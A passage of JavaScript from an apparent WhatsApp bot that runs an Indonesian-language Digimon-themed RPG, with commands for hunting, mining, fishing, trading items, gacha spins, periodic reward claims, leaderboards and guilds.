        if (text === "go") {
        async function uskwkisjwi23() {                   
        const gggha = await pickRandom(["Musuh","Aman","gede"])
        if (gggha === "gede") {
        kurangDarah(userId, 41);
        userdb.recoverplug += 4
        userdb.tp += 7
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 52xp Minus 41 Hp, Training point, recover")
        addXP(m.sender, 42)
        } else if (gggha === "Aman") {
         kurangDarah(userId, 33);
         userdb.tp += 4
         userdb.recoverplug += 3
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 39xp Minus 33 Hp, Training point, recover")
        addXP(m.sender, 32)
        } else if (gggha === "Musuh") {
        userdb.tp += 1
        kurangDarah(userId, 28);
        userdb.recoverplug += 1
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 32xp Minus 29 Hp, Training point, recover")
        addXP(m.sender, 22)
        }
        }
        
         uskwkisjwi23()      
         setTimeout(async () => {
          uskwkisjwi23()
           m.reply("Perjalanan Selesai, Kamu kembali..")
         }, 4500)
         } else if (text === "no") {
         m.reply("Okey")
         }
        break 
        
        case "cari-rpg":
        if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
     
        let caridpng = "*`otomatis di cari`*\n musuh / makanan, Go - No\n\n.cari-rpg Go"
        if (!text) return ptz.sendPoll(m.chat, caridpng, ["cari-rpg go","cari-rpg no"])
        if (text === "go") {
        if (userdb.memcari === true) return m.reply("`[ Kamu sedang di mode mencari ]`")
        userdb.memcari = true
        async function uskwkisjwi2() {                   
        const gggha = await pickRandom(["Musuh","Aman"])
        if (gggha === "Musuh") {
        kurangDarah(userId, 28);
        userdb.recoverplug += 3
        userdb.tp += 1
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 32xp Minus 26 Hp, Training point, recover")
        addXP(m.sender, 32)
        } else if (gggha === "Aman") {
        userdb.digim = 4
        userdb.recoverplug += 1
        m.reply("Kamu memdapatkan makanan, recover untuk digimon mu..")
        }
        }
        
        uskwkisjwi2()
        setTimeout(() => {
        uskwkisjwi2()
        }, 7200)
        setTimeout(() => {
        uskwkisjwi2()
        }, 7200)
        
        setTimeout(() => {
        userdb.memcari = false
        uskwkisjwi2()
        m.reply("Perjalanan Selesai, Kamu kembali..")
        }, 7200)
        } else if (text === "no") {
        m.reply("Okey")
        }
        break
        
  case "setname": case "setname-rpg":
   if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  if (!text) return m.reply("Masukan Nama Baru: .setname Axios")
  userdb.setname = `${text}`
  reply("_*Succes Change Name*_")
     break   
case 'inv': case 'inventori': case 'inventory': case 'profile': case 'my':{
                     if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!isDarah){ addInventoriDarah(m?.sender, DarahAwal) }
if (!isenergy){ addInventorienergy(m?.sender, 270) }     
if (!isInventory){ addInventori(m?.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) }
if (!getMahkota) { addMahkota(m.sender) }
let h = "`"


const sidigib = await sidigi()

let teksehmazeh = `▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*${h}< PROFILE USER >${h}*

─ Name: ${userdb.setname}
─ Limit: Unlimited
─ Hit Cmd: ${userdb.hitcmd}
─ Kerjaan: ${userdb.job}
─ Digimon: ${sidigib}
─ Bits: ${userdb.bits}
─ Rpg Monay: ${isMonay}

*${h}< STATS - DIGIMON >${h}*

─ Training Point: ${userdb.tp}
─ Recover Plug: ${userdb.recoverplug}
─ Healt Point: ${getDarah(m?.sender)} 
─ Kenyang: ${userdb.kenyang}
─ Senang: ${userdb.happy}
─ Attack: ${userdb.attackdigi}

*${h}< STATS - RPG >${h}*\n\n`
teksehmazeh += `*─ Darah kamu:* ${userdb.DarahOrang}\n`
teksehmazeh += `*─ Energy kamu:* ${getenergy(m?.sender)}\n`
teksehmazeh += `*─ Potion Kamu:* ${getPotion(m?.sender)}\n\n`
teksehmazeh += `*${h}[ HASIL  - MINING ]${h}*\n\n`
teksehmazeh += `*─ Besi:* ${getBesi(m?.sender)}\n`
teksehmazeh += `*─ Emas:* ${getEmas(m?.sender)}\n`
teksehmazeh += `*─ Emerald:* ${getEmerald(m?.sender)}\n\n`
teksehmazeh += `*${h}[ HASIL -  BURUAN ]${h}*\n\n`
teksehmazeh += `*─ Ikan:* ${getIkan(m?.sender)}\n`
teksehmazeh += `*─ Ayam:* ${getAyam(m?.sender)}\n`
teksehmazeh += `*─ Kelinci:* ${getKelinci(m?.sender)}\n`
teksehmazeh += `*─ Domba:* ${getDomba(m?.sender)}\n`
teksehmazeh += `*─ Sapi:* ${getSapi(m?.sender)}\n`
teksehmazeh += `*─ Gajah:* ${getGajah(m?.sender)}\n\n`
teksehmazeh += `*${h}[ COLLECTION - POWER ]${h}*\n\n`
teksehmazeh += `*[ Rare ] 👑 Mahkota Tuan Buas:* ${getMahkota(m?.sender)}\n`
teksehmazeh += `*[ Rare ] 🥤 Rei Cho-Cho:* ${getCho(m?.sender)}\n\n`
teksehmazeh += `*${h}[ Rendeem Token ]${h}*\n`
teksehmazeh += `*─ Spin Token:* ${gettoken(m?.sender)}\n\n▬▭▬▭▬▭▬▭▬▭▬`

reply(teksehmazeh)
}
break
        case 'power-mahkota':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  const isMahkota = getMahkota(m?.sender)          
 if (isMahkota < 3) return reply(`Kamu Tidak Punya 3 Mahkota Tuan buas`) 
 addDarahOrang(m?.sender, 2300)
 KurangMahkota(m?.sender, 3)
 reply('*`[ Blood power ]`* - King of many bloods\n*=> Darahmu Bertambah Jadi 1000+*')
            setTimeout(async () => {
                reply('<!> Power Aktif,Mahkota Telah hilang')
                }, 1000)
 }
 break
        case 'power-energy':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  const isMahkotaa = getCho(m?.sender)          
 if (isMahkotaa < 2) return reply(`Kamu Tidak Punya 2 Cho - Cho Power`) 
 addenergy(m?.sender, 3800)
 kurangCho(m?.sender, 2)
 reply('*`[ Stamina power ]`* - Unlimate Rpg\n*=> Energy Bertambah Jadi 2000+*')
            setTimeout(async () => {
                reply('<!> Power Aktif,Cho-cho Power Telah Di minum')
                }, 1000)
 }
 break
         case 'beli': case 'buy':{
                              if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m?.sender) }
 if (!isInventory){ addInventori(m?.sender) }
 if (!text) return ptz.sendPoll(m.chat, "*`[ List Buy - Rpg ]`*\n\nKamu bisa membeli lebih, dengan cara: .buy potion 3", ["buy potion 1","buy baitfood 1","buy token 1"])
 
 var anuu = args[1]
if (args[0] === 'potion'){ 
let noh = 100000 * anuu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m?.sender, noh)
 var apalu = anuu * 1
 addPotion(m?.sender, apalu)
setTimeout( () => {
m.reply(`Transaksi Berhasil\n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Potion Mu:* ${getPotion(m?.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anuu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m?.sender, noh)
 var apalu = anuu * 1
 addUmpan(m?.sender, apalu)
setTimeout( () => {
m.reply(`Transaksi Berhasil\n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Bait Food Mu:* ${getUmpan(m?.sender)}`)
}, 2000) 
} else 
if (args[0] === 'token'){
let noh = 35000 * anuu
 if (!args[1]) return reply(`Contoh : ${prefix + command} token 2\n 1 Token = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m?.sender, noh)
 var apalu = anuu * 3
 addtoken(m.sender, apalu)       
setTimeout(() => {
m.reply(`Transaksi Berhasil\n*Sisa uangmu* : ${getMonay(m?.sender)}`)
}, 2000) 
}
 }
 break
        case 'heal':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!userdb.DarahOrang < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (userdb.DarahOrang > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara .buypotion <jumlah>`) 
 addDarahOrang(m?.sender, 100)
 kurangPotion(m?.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break
        
               case 'sell': case 'jual':{
                   if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!q) reply(`What Do You Want To Sell??\nfish - chicken - rabbit - cow - sheep - elephant - iron - gold - emerald\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m?.sender) }
 if (!isInventory){ addInventori(m?.sender) }
 var anuv = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anuv) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m?.sender, anuv)
 let monaynya = 1500 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Ikan Mu:* ${getIkan(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anuv) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m?.sender, anuv)
 let monaynya = 2500 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Ayam Mu:* ${getAyam(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anuv) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m?.sender, anuv)
 let monaynya = 3000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anuv) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m?.sender, anuv)
 let monaynya = 5000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Domba Mu:* ${getDomba(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anuv) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m?.sender, anuv)
 let monaynya = 10000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Sapi Mu:* ${getSapi(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anuv) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m?.sender, anuv)
 let monaynya = 15000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Gajahmu:* ${getGajah(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anuv) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m?.sender, anuv)
 let monaynya = 16000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Besi Mu:* ${getBesi(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anuv) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m?.sender, anuv)
 let monaynya = 50000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Emas Mu:* ${getEmas(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anuv) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m?.sender, anuv)
 let monaynya = 100000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m?.sender)}`)
}, 2000) 
 } /*else { reply("Incorrect Format!") }*/
 }
 break
       case 'global': case 'leaderboar': case 'lb':{
                           // if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
           let leadern = "*`[ TOP GLOBAL - SELECT ]`*\n\n• .global-buruan *<top buruan>*\n• .global-item *<rare collection>*"
          ptz.sendPoll(m.chat, leadern, ["global-buruan","global-item"])
           }
           break

case "global-item": {
const pathlangka0 = './src/inventory.json';
const datalangka00 = JSON.parse(fs.readFileSync(pathlangka0, 'utf8'));

async function getLeaderboard() {
    const leaderboardxx = datalangka00.map(async user => {
        const chocho = await getCho(user.id);
        const mahkota = await getMahkota(user.id);
        return { id: user.id, chocho, mahkota };
    });
    const results = await Promise.all(leaderboardxx);
    results.sort((a, b) => b.chocho - a.chocho || b.mahkota - a.mahkota);
    const top10langka = results.slice(0, 10);
    return top10langka;
}

async function sendLeaderboard(m) {
    try {
        const leaderboardlangka = await getLeaderboard();
        let tx4t = '*`< 10TP LEADERBOARD - ITEM >`*\n\n';
        let rank = 1;

        leaderboardlangka.forEach(entry => {
            tx4t += `*🏆 Rank #${rank} 🏆*\n`;
            tx4t += `*ID :* ${entry.id.replace("@s.whatsapp.net", "")}\n`;
            tx4t += `*🥤 Chocho* : ${entry.chocho}\n`;
            tx4t += `*👑 Mahkota* : ${entry.mahkota}\n\n`;
            rank++;
        });
        await m.reply(tx4t);
    } catch (error) {
        console.error("Error sending leaderboard:", error);
    }
}
sendLeaderboard(m);
}
break
                    
    case 'lb-buruan-global': case 'global-buruan':
{ 
    if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    _buruan.sort((a, b) => {
        const totalA = a.ikan + a.ayam + a.kelinci + a.domba + a.sapi + a.gajah;
        const totalB = b.ikan + b.ayam + b.kelinci + b.domba + b.sapi + b.gajah;
        return totalB - totalA;
    });
    let txt = '*`< 10TP LEADERBOARD - BURUAN >`*\n\n';
let rank = 1
    for (let i = 0; i < Math.min(_buruan.length, 10); i++) {
    const entry = _buruan[i];
        txt += `*🏆 Rank #${rank} 🏆*\n`;
        txt += `*🐾ID :* ${entry.id.replace("@s.whatsapp.net", "")}\n`;
        txt += `*🐟Ikan* : ${entry.ikan}\n`;
        txt += `*🐔Ayam* : ${entry.ayam}\n`;
        txt += `*🐇Kelinci* : ${entry.kelinci}\n`;
        txt += `*🐑Domba* : ${entry.domba}\n`;
        txt += `*🐄Sapi* : ${entry.sapi}\n`;
        txt += `*🐘Gajah* : ${entry.gajah}\n\n`;
rank++;
    }
    if (txt.trim() === ` *LEADERBOARD* \n\n`) {
        reply("You Top 1");
    } else {
        reply(txt);
    }}
 break
 
 case "harian": case "daily": {
        
        let timerdaily = global.db.data.users[m.sender].lastclaimday + 86400000
  if (new Date - global.db.data.users[m.sender].lastclaimday < 86400000) return reply(`Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${msToTime(timerdaily - new Date())} lagi`)
   
   ezs = Math.ceil(Math.random() * 450)
as = Math.ceil(Math.random() * 99)
bs = Math.ceil(Math.random() * 500000)
cs = Math.ceil(Math.random() * 150)
addMonay(m.sender, bs)
addEmas(m.sender, as)
addBesi(m.sender, cs)
   
        reply(`Selamat kamu mendapatkan\n\n-• ${bs} Money\n-• ${as} Gold\n-• ${cs} Iron`)
        global.db.data.users[m.sender].lastclaimday = new Date * 1
        setTimeout(() => {
					reply(`Daily sudah bisa di dapatkan kembali`)
					}, 86400000)
					}
					break
					  case "bulanan": case "weekly": case "weakly": {
        
        let timerwek = global.db.data.users[m.sender].lastclaimwek + 604800000
  if (new Date - global.db.data.users[m.sender].lastclaimwek < 604800000) return reply(`Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${msToTime(timerwek - new Date())} lagi`)
   
   
   
        ezs = Math.ceil(Math.random() * 450)
as = Math.ceil(Math.random() * 110)
bs = Math.ceil(Math.random() * 900000)
cs = Math.ceil(Math.random() * 180)
addMonay(m.sender, bs)
addEmas(m.sender, as)
addBesi(m.sender, cs)
   
        reply(`Selamat kamu mendapatkan\n\n-• ${bs} Money\n-• ${as} Gold\n-• ${cs} Iron`)
    global.db.data.users[m.sender].lastclaimwek = new Date * 1
					}
					break
					case "tahunan": case "yearly": {
        
        let timeryer = global.db.data.users[m.sender].lastclaimyer + 31536000000
  if (new Date - global.db.data.users[m.sender].lastclaimyer < 31536000000) return reply(`Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${msToTime(timerwek - new Date())} lagi`)
   
   
   
        ezs = Math.ceil(Math.random() * 450)
as = Math.ceil(Math.random() * 600)
bs = Math.ceil(Math.random() * 5000000)
cs = Math.ceil(Math.random() * 290)
addMonay(m.sender, bs)
addEmas(m.sender, as)
addBesi(m.sender, cs)
   
        reply(`Selamat kamu mendapatkan\n\n-• ${bs} Money\n-• ${as} Gold\n-• ${cs} Iron`)
    global.db.data.users[m.sender].lastclaimyer = new Date * 1
					}
					break
 
        case 'gacha': case 'spin':
                         if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
        // mahkota
        const spingc = () => {

let token1 = [1,2,3,4,9,2,5,2,7,1,6,2,2,6,2,8,4,1,2,3,4,4,5,2,3,2]
let token2 = [1,1,1,1,1,0,2,2,2,2,0,0,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,2,1,1,2,1,1,2,2,2,1,1,1,1,1,2,1,1,2,1,1,2,1,0,0,1,1,1,1,1,1,1,2,1,2,1,0,0,1,1,1,1,2,1,1,0,0,2,2,2,1,1,1,2,1,1,1,1,0,2,2,0,1,1,1]
var mahkkkkk = token1[Math.floor(Math.random() * token1.length)]
var mahkkkkkkk = token2[Math.floor(Math.random() * token2.length)]
if (istoken < 5) return reply('Token spin Habis Kerja lah dan beli token lagi')
        if (mahkkkkkkk === 0) {
            reply(`Mendapatkan ${mahkkkkk} Digitrails Token`)
            } else if (mahkkkkkkk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkkkkk} Item`)
                addMahkota(m.sender, mahkkkkk)
                } else if (mahkkkkkkk === 2) {
       reply(`Cho-cho Energy Terkoleksi -> ${mahkkkkk} Item`)
                    addCho(m.sender, mahkkkkk)
                }
}
        let mahko = [1,2,0,0,2,0,0,0,2,0,1,0,1,0,0,1,0,0,2,1,0,0,0,2,0,0,2,0,0,0,1,0,0,2,0,0,0,1,2,0,1,1,0,0,0,0,0,2,0,1,0,0,0,1,0,0,2,0,0,1,0,0,1,1,0,2,0,0,0,1,1,0,0,2,0,2,1,0,1,0,2,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,2,0,,0,0,0,2,0,0,1,1,0,0,0,1,1,0,0,0,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,1,0,0,0,1,2,0,0,1,2,0,0,0] // Rare math
var mahk = mahko[Math.floor(Math.random() * mahko.length)]
let token1 = [1,2,3,2,2,7,1,6,2,2,6,2,4,1,2,3,4,4,5,2,3,2]
let token2 = [1,1,1,1,1,0,2,2,2,2,0,0,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,2,1,1,2,1,1,2,2,2,1,1,1,1,1,2,1,1,2,1,1,2,1,0,0,1,1,1,1,1,1,1,2,1,2,1,0,0,1,1,1,1,2,1,1,0,0,2,2,2,1,1,1,2,1,1,1,1,0,2,2,0,1,1,1]
var mahkk = token1[Math.floor(Math.random() * token1.length)]
var mahkkk = token2[Math.floor(Math.random() * token2.length)]
if (args[0] === 'extra'){
    if (istoken < 5) return reply('Token spin Habis Kerja lah dan beli token lagi')
await loading()
        setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
    } else
        if (args[0] === 'normal'){
            
            if (istoken < 1) return reply('Token spin Habis Kerja lah dan beli token lagi')
            await loading()
            if (mahk === 0) {
            reply(`Mendapatkan ${mahkk} Digitrails Token`)
            } else if (mahk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkk} Item`)
                addMahkota(m.sender, mahkk)
                } else if (mahk === 2) {
       reply(`Cho-cho Energy Terkoleksi -> ${mahkk} Item`)
                    addCho(m.sender, mahkk)
                           
                }
            } else 
                if (args[0] === 'free') {
                 let user = global.db.data.users[m.sender];
    if (new Date() - user.lasttokenn < 3600000) {
      m?.reply( '⏰ Anda hanya dapat gratis spin sekali dalam 1 jam.');
      return;
    }
    user.lasttokenn = new Date();        
                if (mahk === 0) {
            reply(`Mendapatkan ${mahkk} Digitrails Token`)
            } else if (mahk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkk} Item`)
                addMahkota(m.sender, mahkk)
                } else if (mahk === 2) {
       reply(`Cho-cho Energy Terkoleksi -> ${mahkk} Item`)
                    addCho(m.sender, mahkk)
                }
                    let cooldownn = 3600000; 
    user.kuldontokenn = new Date() * 1 + cooldownn;
                    } else {
               reply('*`[ PILIH - SPIN ]`*\n> • Free *<24h limit>*\n> • Normal *<1x spin>*\n> • Extra *<5x spin>*\n\nExample : .spin free')
                         
                         }
        break
        case 'mining': case 'mine':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!isInventory){ addInventori(m?.sender) }
if (userdb.DarahOrang < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]

var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
reply(caption)
}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang`)
}, 1500)
userdb.DarahOrang -= 15
kurangenergy(m.sender, 21)
addBesi(m?.sender, besinya)
addEmas(m.sended, emasnya)
addMahkota(m?.sender, mahk)      
addEmerald(m?.sender, emeraldnya)
}
break
case 'hunt': case 'hunting': case 'berburu':{
    if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
                
                     
 
 if (userdb.DarahOrang < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
} else
 if (lokasinya === 'Hutan Amazon') {
} else
 if (lokasinya === 'Hutan Tropis') {
} else
 if (lokasinya === 'Padang Rumput') {
} else
 if (lokasinya === 'Hutan Afrika') {
} else
 if (lokasinya === 'Pegunungan') {
}
 setTimeout( () => {
let teksehmazeh = `*[ Hasil Berburu ]*\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `*[ INFO ]*\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${userdb.DarahOrang}\n`
reply(teksehmazeh)
}, 5000)
setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m?.sender, ikanmu) 
addAyam(m?.sender, ayam) 
addKelinci(m?.sender, kelinci)
addDomba(m?.sender, domba)
addSapi(m?.sender, sapi)
addGajah(m?.sender, gajah)
kurangenergy(m.sender, 21)
 userdb.DarahOrang -= 15
 }
 break  
        case 'mancing': case 'menancing':
        if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
        var ikanmuu = Math.ceil(Math.random() * 4)
        kurangenergy(m.sender, 21)
        addIkan(m?.sender, ikanmuu) 
        m.reply('Memancing . . .')
        await sleep(2700)
        m.reply('Ada Ikan Menyambar Umpan mu !')
        await sleep(1300)
        m.reply ('Kamu Dapat Ikan Nya !. Sedang melepaskan Kail pancing . . .')
        setTimeout(async () => {
        reply(`*Hasil Mancing*\n\nIkan: ${ikanmuu}\nKecapean Nunggu Energymu: ${getenergy(m?.sender)}`)
        }, 3000)
        break
        
         // Guild Rpg
 case "myguild": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 const showMyGuild = (userId, m) => {
    const guildIdc = userGuilds[userId];
    if (!guildIdc) {
        return reply("You are not a member of any guild.");
    }

    return showGuildInfo(guildIdc, m);
};
 showMyGuild(m.sender, m)
 }
 break
 
 case "guildinfo": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return reply(`[ Veemon ] >> Masukan Nama guild`)
 const guildIdd = text
 getGuildInfo(text)
 }
 break
 
